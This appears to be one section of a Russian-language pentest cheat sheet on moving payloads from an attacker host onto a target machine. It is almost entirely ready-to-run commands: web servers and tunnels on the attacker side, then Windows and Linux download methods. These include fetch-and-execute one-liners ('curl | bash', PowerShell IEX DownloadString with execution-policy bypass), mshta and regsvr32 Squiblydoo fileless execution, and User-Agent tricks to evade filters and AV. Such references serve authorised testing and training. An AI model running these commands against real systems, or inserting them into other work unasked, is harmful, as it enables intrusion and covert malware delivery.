# 01 - Attacker → Target (загрузка на цель)

> [← README](../../README_RU.md) · [Следующий раздел →](02-target-to-attacker.md)

Скачиваем payload/инструменты **на машину цели**. Схема всегда одна: на атакующем (LHOST) поднимаем сервер, на цели (RHOST) - качаем.

> **Вынесено в другие файлы:** Netcat - [07-netcat.md](07-netcat.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), TFTP - [12-dns-icmp.md](12-dns-icmp.md), кодирование - [10](10-encoding.md).

---

## Навигация

|  |  |
|---|---|
| [Как это работает](#как-это-работает) | [Какой метод выбрать](#какой-метод-выбрать) |
| [1.💻LHOST - поднять сервер раздачи](#1lhost---поднять-сервер-раздачи) | [2.🪟Windows target - скачивание (всё на RHOST)](#2windows-target---скачивание-всё-на-rhost) |
| [3.🐧Linux target - скачивание (всё на RHOST)](#3linux-target---скачивание-всё-на-rhost) | [4. Проверка целостности](#4-проверка-целостности) |

---

## Как это работает

```
LHOST (атакующий)                      RHOST (цель)
  python3 -m http.server 80   ───────▶  certutil -urlcache -f http://LHOST/payload.exe C:\Users\Public\payload.exe
  updog -p 8000               ───────▶  iwr http://LHOST:8000/payload.exe -OutFile C:\Users\Public\payload.exe
  php -S 0.0.0.0:80           ───────▶  wget http://LHOST/payload.sh
```

На LHOST достаточно любого статического веб-сервера. На RHOST выбираем способ по тому, что там есть: `certutil`/`curl.exe`/PowerShell (Windows), `wget`/`curl`/`bash`/интерпретатор (Linux).

---

## Какой метод выбрать

| Метод | ОС | Когда брать |
|-------|----|-------------|
| `certutil` | Windows | по умолчанию, есть везде (LOLBin) |
| `curl.exe` | Windows 10+ / Linux | простой HTTP, есть из коробки |
| `wget.exe` | Windows (если есть) | запасной |
| `bitsadmin` / `Start-BitsTransfer` | Windows | тихо, фоново (BITS) |
| `iwr` / `irm` / `WebClient` | Windows | PowerShell-путь |
| `mshta` / `regsvr32` | Windows | fileless-исполнение |
| `wget` / `curl` | Linux | по умолчанию |
| `/dev/tcp` | Linux | нет вообще никаких утилит |
| `python`/`perl`/`php`/`ruby`/`node` | Linux | есть интерпретатор |

> **Важно (PowerShell):** `wget` и `curl` в PowerShell - это **алиасы** `Invoke-WebRequest`, а не GNU-утилиты. Поэтому `wget -O`/`curl -o` там не работают. Нужны именно `wget.exe` / `curl.exe` (или `iwr`).

---

## 1.💻LHOST - поднять сервер раздачи

### Python

**Python 3 - порт 80:**
```bash
python3 -m http.server 80
```

**Python 3 - порт 8000 на всех интерфейсах:**
```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

**Python 2:**
```bash
python2 -m SimpleHTTPServer 80
```

> `python3 -m http.server` - HTTP/1.0 без `Range`: для BITS нужен `/dynamic` (`bitsadmin`) или `-Dynamic` (`Start-BitsTransfer`), либо сервер на Ruby/Busybox/nginx.

### PHP

**PHP built-in сервер:**
```bash
php -S 0.0.0.0:80
```

> У `php -S` поддержки `Range` тоже нет.

### Ruby

**Ruby WEBrick:**
```bash
ruby -run -e httpd . -p 80
```

**Ruby WEBrick на порту 8000 (без root):**
```bash
ruby -run -e httpd . -p 8000
```

> WEBrick говорит по HTTP/1.1 и поддерживает `Range`, поэтому работает с BITS (`bitsadmin`, `Start-BitsTransfer`) без `/dynamic` и `-Dynamic`.

### Busybox

**busybox httpd:**
```bash
busybox httpd -f -p 80
```

**busybox httpd на порту 8000 (без root):**
```bash
busybox httpd -f -p 8000
```

> `busybox httpd` тоже поддерживает `Range` - подходит для BITS.

### updog - современный сервер

**Установка и запуск:**
```bash
pipx install updog && updog -d . -p 8000
```

**С паролем и TLS:**
```bash
updog -d . -p 8443 --ssl --password 'S3cret'
```

> `updog` отвечает на Range-запрос `206` (может не отдавать `Accept-Ranges`), поэтому BITS normal работает.

### nginx

**Раздавать статику через nginx:**
```bash
sudo cp payload.exe /var/www/html/ && sudo systemctl start nginx
```

**nginx в Docker (если есть docker):**
```bash
docker run --rm -p 80:80 -v "$PWD:/usr/share/nginx/html:ro" nginx
```

**Python в Docker:**
```bash
docker run --rm -p 80:8000 -v "$PWD:/srv" -w /srv python:3 python -m http.server 8000
```

### HTTPS - когда цель качает только по TLS

**Сгенерировать самоподписанный сертификат:**
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Раздать файлы по HTTPS (`-WWW` отдаёт файлы из текущего каталога):**
```bash
openssl s_server -accept 443 -cert server.pem -key server.pem -WWW
```

### Выставить сервер наружу (если цель не видит LHOST напрямую)

**cloudflared - публичный URL на наш localhost:**
```bash
cloudflared tunnel --url http://localhost:8000
```

**ngrok - альтернатива:**
```bash
ngrok http 8000
```

---

## 2.🪟Windows target - скачивание (всё на RHOST)

### Certutil

Самый надёжный download под Windows - легитимный системный бинарь.

**Базовый download:**
```cmd
certutil -urlcache -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**С нестандартным портом:**
```cmd
certutil -urlcache -f http://%LHOST%:1337/payload.exe C:\Users\Public\payload.exe
```

**Вариант со `-split` (иногда качает там, где обычный не тянет):**
```cmd
certutil -urlcache -split -f http://%LHOST%:1337/payload.exe C:\Users\Public\payload.exe
```

**Декодировать base64-файл (см. [10 - Encoding](10-encoding.md)):**
```cmd
certutil -decode encoded.txt C:\Users\Public\decoded.exe
```

### Curl / wget (CMD, Windows 10+)

`curl` встроен в Windows 10+; `wget` сработает, только если есть `wget.exe`.

> В Windows указывайте абсолютный путь (`-o C:\Users\Public\payload.exe`). Относительное имя попадёт в текущий каталог - часто в `System32`, если шелл запущен от админа.

**curl.exe - скачать файл:**
```cmd
curl http://%LHOST%:1337/payload.exe -o C:\Users\Public\payload.exe
```

**curl.exe - игнорировать самоподписанный серт:**
```cmd
curl -k https://%LHOST%/payload.exe -o C:\Users\Public\payload.exe
```

**wget.exe - если доступен:**
```cmd
wget http://%LHOST%:1337/payload.exe -O C:\Users\Public\payload.exe
```

### BITSAdmin (CMD)

Качает фоновой службой BITS - тихо, но иногда режется политиками.

> **BITS normal нужен сервер, который обрабатывает `Range`.** `python3 -m http.server` и `php -S` отвечают на Range-запрос `200` и отдают весь файл, поэтому BITS падает с `0x80200013` (`BG_E_INSUFFICIENT_RANGE_SUPPORT`).
>
> `Accept-Ranges` - только подсказка: некоторые серверы (например, `updog`/Werkzeug) отдают `206` без этого заголовка, и BITS normal всё равно работает.
>
> | Сервер на LHOST | Range probe | BITS normal |
> |---|---|---|
> | `busybox httpd -f -p 8000` | `206` | работает |
> | `ruby -run -e httpd . -p 8000` | `206` | работает |
> | `nginx` (раздел 1) | `206` | работает |
> | `updog -d . -p 8000` | `206` (может не отдавать `Accept-Ranges`) | работает |
> | `python3 -m http.server` | `200` | используйте `/dynamic` или `-Dynamic` |
> | `php -S` | `200` | используйте `/dynamic` или `-Dynamic` |

**Проверить сервер до того, как винить BITS:**
```bash
curl -s -D- -o /dev/null -H 'Range: bytes=0-9' http://$LHOST:8000/payload.exe
```
`206 Partial Content` - сервер поддерживает Range; `200 OK` - нет, используйте `/dynamic`/`-Dynamic` или другой сервер.

> У `Start-BitsTransfer` есть `-Dynamic` для того же ослабления - используйте его с `python3 -m http.server`.

**Скачать с высоким приоритетом (сервер с Range):**
```cmd
bitsadmin /transfer job /download /priority high http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**`python3 -m http.server` / `php -S` - добавьте `/dynamic`:**
```cmd
bitsadmin /transfer job /download /priority high /dynamic http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

> `/dynamic` включает `BITS_JOB_PROPERTY_DYNAMIC_CONTENT` и ослабляет требование к Range на сервере. Если задание всё равно падает - перейдите на `busybox`/`ruby`/`nginx`; `certutil -urlcache` работает с любым сервером как fallback.
>
> Готовая матрица: [`scripts/Windows-download-test.ps1`](../../scripts/Windows-download-test.ps1) - по умолчанию останавливается на первом рабочем способе; `-NoLogs` = тихий `Done!`; `-Log` = быстрый лог; `-LOLBINS` = только LOLBins; `-All` = полная матрица + лог.

### Start-BitsTransfer (PowerShell)

> **Про `${LHOST}`:** это IP атакующего. Форма со скобками работает и перед `/`, и перед `:port` (`${LHOST}:1337`), поэтому в примерах используется везде. Под каждой PowerShell-командой ниже есть вариант с литеральным IP в комментарии; `192.168.2.5` - пример LHOST, замените на свой. В Windows всегда указывайте абсолютный путь: относительное имя пишется в текущий каталог (часто `C:\Windows\System32` в шелле с админом) - в примерах ниже используется `C:\Users\Public\`.

То же, что BITSAdmin, но из PowerShell.

> **Против `python3 -m http.server` добавьте `-Dynamic`.** `Start-BitsTransfer` использует тот же движок BITS и без него получит `0x80200013`. `-Dynamic` ослабляет требование к Range на сервере; альтернатива - `busybox httpd -f -p 8000` или `ruby -run -e httpd . -p 8000`.

**Скачать файл:**
```powershell
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe"
# literal IP:
# Start-BitsTransfer -Source "http://192.168.2.5/payload.exe" -Destination "C:\Users\Public\payload.exe"
```

**С сервера без Range (`-Dynamic`):**
```powershell
Start-BitsTransfer -Dynamic -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe"
# literal IP:
# Start-BitsTransfer -Dynamic -Source "http://192.168.2.5/payload.exe" -Destination "C:\Users\Public\payload.exe"
```

**Через системный прокси:**
```powershell
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -ProxyUsage SystemDefault
# literal IP:
# Start-BitsTransfer -Source "http://192.168.2.5/payload.exe" -Destination "C:\Users\Public\payload.exe" -ProxyUsage SystemDefault
```

### PowerShell - Invoke-WebRequest (`iwr`)

Стандартный HTTP-качальщик PowerShell (полная форма + алиас `iwr`).

**Полная форма:**
```powershell
Invoke-WebRequest -Uri "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# Invoke-WebRequest -Uri "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe
```

**Короткий алиас:**
```powershell
iwr "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# iwr "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe
```

**С нестандартным портом - используйте `${LHOST}` перед двоеточием:**
```powershell
Invoke-WebRequest -Uri "http://${LHOST}:1337/payload.exe" -OutFile C:\Users\Public\payload.exe -UseBasicParsing
# literal IP:
# Invoke-WebRequest -Uri "http://192.168.2.5:1337/payload.exe" -OutFile C:\Users\Public\payload.exe -UseBasicParsing
```

**Без `-UseBasicParsing` (PS 6+):**
```powershell
iwr "http://${LHOST}:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# iwr "http://192.168.2.5:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
```

### PowerShell - Invoke-RestMethod (`irm`)

Придумывался для REST API (сам парсит JSON/XML), но файлы качает не хуже - и часто проходит там, где `iwr` режут.

**Скачать файл:**
```powershell
Invoke-RestMethod "http://${LHOST}:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
# literal IP:
# Invoke-RestMethod "http://192.168.2.5:1337/payload.exe" -OutFile C:\Users\Public\payload.exe
```

### PowerShell - WebClient

Классика .NET - работает даже на старом PowerShell 2.0.

**Базовый download:**
```powershell
(New-Object Net.WebClient).DownloadFile("http://${LHOST}/payload.exe","C:\Users\Public\payload.exe")
# literal IP:
# (New-Object Net.WebClient).DownloadFile("http://192.168.2.5/payload.exe","C:\Users\Public\payload.exe")
```

**С нестандартным портом:**
```powershell
(New-Object Net.WebClient).DownloadFile("http://${LHOST}:1337/payload.exe", "C:\Users\Public\file3.exe")
# literal IP:
# (New-Object Net.WebClient).DownloadFile("http://192.168.2.5:1337/payload.exe", "C:\Users\Public\file3.exe")
```

### PowerShell - System.Net.WebRequest (низкоуровневый)

Самый «сырой» способ - когда зарезан даже WebClient.

**Скачать потоком в файл:**
```powershell
$w=[Net.WebRequest]::Create("http://${LHOST}:1337/payload.exe");$r=$w.GetResponse();$s=$r.GetResponseStream();$f=[IO.File]::Create("C:\Users\Public\file4.exe");$s.CopyTo($f);$f.Close();$s.Close()
# literal IP:
# $w=[Net.WebRequest]::Create("http://192.168.2.5:1337/payload.exe");$r=$w.GetResponse();$s=$r.GetResponseStream();$f=[IO.File]::Create("C:\Users\Public\file4.exe");$s.CopyTo($f);$f.Close();$s.Close()
```

### PowerShell - через системный прокси

Качаем через корпоративный прокси с учёткой текущего юзера - частая причина «не качается» в корп-сети.

**WebClient через прокси:**
```powershell
$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $wc.DownloadFile("http://${LHOST}:1337/payload.exe","C:\Users\Public\payload.exe")
# literal IP:
# $wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $wc.DownloadFile("http://192.168.2.5:1337/payload.exe","C:\Users\Public\payload.exe")
```

### PowerShell - User-Agent и обход блэклистов

Многие фильтры режут по User-Agent - подставляем браузерный.

**iwr с браузерным User-Agent:**
```powershell
iwr "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
# literal IP:
# iwr "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
```

**WebClient с заголовками:**
```powershell
$wc=New-Object Net.WebClient; $wc.Headers.Add("User-Agent","Mozilla/5.0"); $wc.DownloadFile("http://${LHOST}/payload.exe","C:\Users\Public\payload.exe")
# literal IP:
# $wc=New-Object Net.WebClient; $wc.Headers.Add("User-Agent","Mozilla/5.0"); $wc.DownloadFile("http://192.168.2.5/payload.exe","C:\Users\Public\payload.exe")
```

**Invoke-WebRequest с произвольными заголовками:**
```powershell
iwr "http://${LHOST}/payload.exe" -OutFile C:\Users\Public\payload.exe -Headers @{ "User-Agent"="Mozilla/5.0"; "Referer"="http://${LHOST}/" }
# literal IP:
# iwr "http://192.168.2.5/payload.exe" -OutFile C:\Users\Public\payload.exe -Headers @{ "User-Agent"="Mozilla/5.0"; "Referer"="http://192.168.2.5/" }
```

### PowerShell - короткая форма и обход execution policy

Запуск из cmd одной строкой + снятие политики, если `.ps1` не даёт выполнить.

**Короткая форма:**
```cmd
powershell -c "iwr http://%LHOST%/payload.exe -OutFile C:\Users\Public\payload.exe"
```

**Обход execution policy:**
```cmd
powershell -ep bypass -c "iwr http://%LHOST%/payload.exe -OutFile C:\Users\Public\payload.exe"
```

**Скачать и сразу выполнить `.ps1`:**
```cmd
powershell -ep bypass -c "iwr http://%LHOST%:1337/winPEAS.ps1 -OutFile C:\Users\Public\s.ps1; & C:\Users\Public\s.ps1"
```

### PowerShell - fileless (качаем и исполняем в памяти)

Скрипт выполняется прямо в RAM, на диск ничего не падает - меньше следов для AV.

**WebClient.DownloadString + IEX:**
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://${LHOST}/script.ps1")
# literal IP:
# IEX(New-Object Net.WebClient).DownloadString("http://192.168.2.5/script.ps1")
```

**iwr + iex:**
```powershell
iex(iwr "http://${LHOST}/script.ps1" -UseBasicParsing)
# literal IP:
# iex(iwr "http://192.168.2.5/script.ps1" -UseBasicParsing)
```

**С нестандартным портом:**
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://${LHOST}:1337/winPEAS.ps1")
# literal IP:
# IEX(New-Object Net.WebClient).DownloadString("http://192.168.2.5:1337/winPEAS.ps1")
```

**Из cmd одной строкой:**
```cmd
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://%LHOST%:1337/winPEAS.ps1')"
```

Полезный gist: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

### mshta - fileless-исполнение

`mshta.exe` умеет загружать и выполнять HTA/скрипт по URL.

**Выполнить удалённый HTA:**
```cmd
mshta http://%LHOST%/payload.hta
```

**VBScript inline (заменяем `calc` на свой payload):**
```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")
```

### regsvr32 - Squiblydoo (SCT по URL)

`regsvr32` подгружает и выполняет `.sct`-скрипт по HTTP, не пиша на диск.

**LHOST - подготовить `payload.sct`:**
```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="p" classid="{00000000-0000-0000-0000-000000000000}"></registration>
  <script language="JScript">
    <![CDATA[ new ActiveXObject("WScript.Shell").Run("calc"); ]]>
  </script>
</scriptlet>
```

**RHOST - выполнить:**
```cmd
regsvr32 /s /n /u /i:http://%LHOST%/payload.sct scrobj.dll
```

### desktopimgdownldr - LOLBin download

Системная утилита для обоев умеет скачивать файл по URL. Кладёт его в `%SystemRoot%\Personalization\LockScreenImage\` и ставит на lockscreen.

**Скачать файл:**
```cmd
desktopimgdownldr.exe /lockscreenurl:http://%LHOST%/payload.exe /eventName:foo
```

**Сменить каталог сохранения через подмену `SYSTEMROOT`:**
```cmd
set "SYSTEMROOT=C:\Windows\Temp" && desktopimgdownldr.exe /lockscreenurl:http://%LHOST%/payload.exe /eventName:foo
```

> **Побочный эффект - меняет состояние системы.** Он пишет в `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP` (`LockScreenImageUrl`, `LockScreenImagePath`, `LockScreenImageStatus`) и меняет lockscreen. Это не разрушительно, но и не незаметно: ключи остаются, пока вы не вернёте прежний lockscreen или не удалите их. Для записи в HKLM может требоваться админ - только лаборатория.
>
> Тестер запускает его только с `-Danger`; `-All` исключает danger-методы. См. [scripts/README-RU.md](../../scripts/README-RU.md).

### VBScript

**Создать `wget.vbs`:**
```vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Скачать любой файл:**
```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### JavaScript

**Создать `wget.js`:**
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Скачать любой файл:**
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### SMB Copy (краткая шпаргалка)

> Полная настройка SMB-сервера - в [03-smb.md](03-smb.md).

**copy / xcopy с шары:**
```cmd
copy \\%LHOST%\share\payload.exe C:\Users\Public\payload.exe
```

**xcopy:**
```cmd
xcopy \\%LHOST%\share\payload.exe C:\Users\Public\
```

**Примонтировать диск и скопировать:**
```cmd
net use Z: \\%LHOST%\share && copy Z:\payload.exe C:\Users\Public\
```

**С учётными данными:**
```cmd
net use Z: \\%LHOST%\share /user:test test
```

---

## 3.🐧Linux target - скачивание (всё на RHOST)

### Wget

Есть почти на любом Linux - самый привычный вариант.

**Обычное скачивание:**
```bash
wget http://$LHOST/payload.sh
```

**В конкретное место:**
```bash
wget http://$LHOST/payload.sh -O /tmp/payload.sh
```

**Тихий режим:**
```bash
wget -q http://$LHOST/payload.sh -O /tmp/payload.sh
```

**Докачать частично скачанное:**
```bash
wget -c http://$LHOST/largefile.tar
```

**С браузерным User-Agent (обход блэклистов):**
```bash
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://$LHOST/payload.sh -O /tmp/payload.sh
```

### Curl

Универсальнее wget: умеет пайпить в bash и слать POST.

**Скачать в файл:**
```bash
curl http://$LHOST/payload.sh -o /tmp/payload.sh
```

**Скачать и сразу выполнить:**
```bash
curl http://$LHOST/payload.sh | bash
```

**С учётом редиректов:**
```bash
curl -L http://$LHOST/payload.sh -o payload.sh
```

**С аутентификацией:**
```bash
curl -u user:pass http://$LHOST/payload.sh -o payload.sh
```

**Самоподписанный HTTPS:**
```bash
curl -k https://$LHOST/payload.sh -o payload.sh
```

**С браузерным User-Agent:**
```bash
curl -A "Mozilla/5.0 (X11; Linux x86_64)" http://$LHOST/payload.sh -o payload.sh
```

### Bash /dev/tcp

Когда в системе нет вообще ничего - качаем встроенными средствами bash. Это работает только в **bash**; в `sh`/`dash` конструкции `/dev/tcp` нет.

**Сначала подними сервер на LHOST.** Команды ниже выполняются на цели (RHOST), а файл должен лежать на атакующем (LHOST).

Вариант 1 - HTTP-сервер (проще для файлов):
```bash
# LHOST: из каталога с payload
# порт 80 требует root; без root используйте 8000 и поменяйте URL
python3 -m http.server 80
```

Вариант 2 - обычный TCP-сервер через nc (без HTTP-заголовков):
```bash
# LHOST: отдать файл и завершить соединение
nc -lvnp 9000 < payload.sh
```

```bash
# RHOST: принять файл по TCP
cat < /dev/tcp/$LHOST/9000 > payload.sh
```

Дальше примеры с HTTP-сервером на LHOST.

**Простой GET (заголовки останутся в файле):**
```bash
cat < /dev/tcp/$LHOST/80 > payload.sh
```

**One-liner (GET + сразу обрезаем HTTP-заголовки):**
```bash
bash -c "exec 3<>/dev/tcp/$LHOST/80; printf 'GET /payload.sh HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n' '$LHOST' >&3; sed '1,/^\r*\$/d' <&3 > /tmp/payload.sh; exec 3<&-"
```

**Пошагово - открыть сокет:**
```bash
exec 3<>/dev/tcp/$LHOST/80
```

**Пошагово - послать GET-запрос:**
```bash
echo -e "GET /payload.sh HTTP/1.1\n\n" >&3
```

**Пошагово - прочитать ответ:**
```bash
cat <&3
```

> Если бинарь «сломался» - скорее всего в файл попали HTTP-заголовки. Убираем `sed` и срезаем их вручную.

### Python

Есть на большинстве Linux-хостов (py3, иногда py2).

**Python 3:**
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST/payload.sh', '/tmp/payload.sh')"
```

**Python 2:**
```bash
python2 -c "import urllib; urllib.urlretrieve('http://$LHOST/payload.sh', '/tmp/payload.sh')"
```

### Perl

Запасной вариант, когда есть perl, но нет wget/curl.

**LWP::Simple - скачать в файл:**
```bash
perl -e 'use LWP::Simple; getstore("http://".$ENV{LHOST}."/payload.sh", "/tmp/payload.sh");'
```

**Скачать публичный скрипт:**
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### PHP

На веб-серверах php стоит почти всегда - качаем им.

**file_get_contents + file_put_contents:**
```bash
php -r 'file_put_contents("/tmp/payload.sh", file_get_contents("http://".getenv("LHOST")."/payload.sh"));'
```

**Скачать публичный скрипт:**
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**Скачать через fopen (потоком, для больших файлов):**
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**Скачать и сразу передать в bash:**
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby

Если на хосте крутится ruby (часто на dev-машинах).

**Скачать в файл:**
```bash
ruby -e 'require "net/http"; File.write("/tmp/payload.sh", Net::HTTP.get(URI("http://#{ENV["LHOST"]}/payload.sh")))'
```

**Скачать публичный скрипт:**
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Node.js

Часто есть на dev-серверах и в контейнерах.

**Скачать в файл:**
```bash
node -e 'require("http").get("http://'"$LHOST"'/payload.sh",r=>r.pipe(require("fs").createWriteStream("/tmp/payload.sh")))'
```

**HTTPS:**
```bash
node -e 'require("https").get("https://'"$LHOST"'/payload.sh",r=>r.pipe(require("fs").createWriteStream("/tmp/payload.sh")))'
```

### busybox wget

Минималистичные системы (роутеры, IoT, Alpine) - busybox умеет wget.

**Скачать:**
```bash
busybox wget http://$LHOST/payload.sh -O /tmp/payload.sh
```

### git clone

Если payload лежит в репозитории (а `git` есть).

**Клонировать репозиторий:**
```bash
git clone https://github.com/user/tools.git /tmp/tools
```

---

## 4. Проверка целостности

Сверяем хэш на обоих концах - иначе битый файл не заметим.

**LHOST / Linux RHOST:**
```bash
md5sum payload.exe
```

**Windows (PowerShell):**
```powershell
Get-FileHash C:\Users\Public\payload.exe -Algorithm md5
```

**Windows (CMD):**
```cmd
certutil -hashfile payload.exe MD5
```

---

**См. также:** [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [09 - LOLBins](09-lolbins.md) · [10 - Encoding](10-encoding.md) · [14 - Troubleshooting](14-troubleshooting.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
